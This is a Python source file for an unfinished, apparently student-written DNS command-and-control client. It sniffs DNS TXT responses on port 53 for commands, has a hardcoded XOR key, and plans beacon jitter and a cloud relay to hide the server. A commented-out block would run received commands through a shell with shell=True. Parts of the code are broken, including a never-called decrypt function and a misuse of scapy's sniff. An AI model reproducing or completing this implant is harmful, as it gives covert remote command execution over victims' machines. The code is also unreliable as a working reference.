#!/usr/bin/env python3

# TODO Later: implement DNS packet transfering with scapy, packet crafting
# TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE
# Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
from scapy.all import AsyncSniffer, Packet, sniff
from scapy.layers.dns import DNS
import subprocess
import os
import re
import argparse
import socket
from time import sleep

key = "ringring"
debug = False


def decrypt(ciphertext):
    """
    Decrypt a message encrypted with the XOR cipher with the given key.
    """
    key_bytes = key.encode()
    message = bytearray()
    for i, b in enumerate(bytes.fromhex(ciphertext)):
        message.append(b ^ key_bytes[i % len(key_bytes)])
    return message.decode()


def sniffHandle(packet: Packet) -> None:
    """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
    try:
        # DNS.qr.qtype: 16 the txt record
        if packet.haslayer(DNS) and packet.getlayer(DNS).an[1].type == 16:
            # packet[3] is the raw layer that contains that data passed into the ping command
            # should we need the query name it is here: dns.qd.qname.decode("utf-8")
            dns = packet.getlayer(DNS)
            decodedCommand = dns.an[1].rdata[0].decode("utf-8")
            print(decodedCommand)

            # # checks if the user passed in the cd command
            # # regex: ^: start of line + cd + \s: whitespace + (.*): group one of anything aka a command + $: end of line
            # cd_match = re.match(r"^cd\s*(.*)$", decodedCommand)

            # if decodedCommand == "kill":
            #     raise Exception("Programmed killed by server")
            # # this is what the windows ping utility passes for data
            # elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
            #     pass
            # elif cd_match:
            #     path = cd_match.group(1)
            #     os.chdir(path=path)
            # else:
            #     subprocess.run(decodedCommand, shell=True, capture_output=not debug)
    # the linux ping command passes some weird format in the raw load so this is to catch it, ultimately it doesn't matter if catch it
    except UnicodeDecodeError:
        print("Oh well")


def sniffer() -> None:
    """Starts an asynchronus sniffer then allows for the program to be interrupted"""
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.bind((socket.gethostname(), 53))
    sniffer = sniff(filter="udp port 53", prn=sniffHandle, sock=s)

    print("[*] Start sniffing...")
    sniffer.start()

    try:
        # TODO find a way to make this betterer
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("[*] Stop sniffing")
        sniffer.stop()


def main() -> None:
    """Runs the client handling the packets"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()

    # Check if the debug flag is set
    if args.debug:
        global debug
        debug = True

    sniffer()


if __name__ == "__main__":
    main()
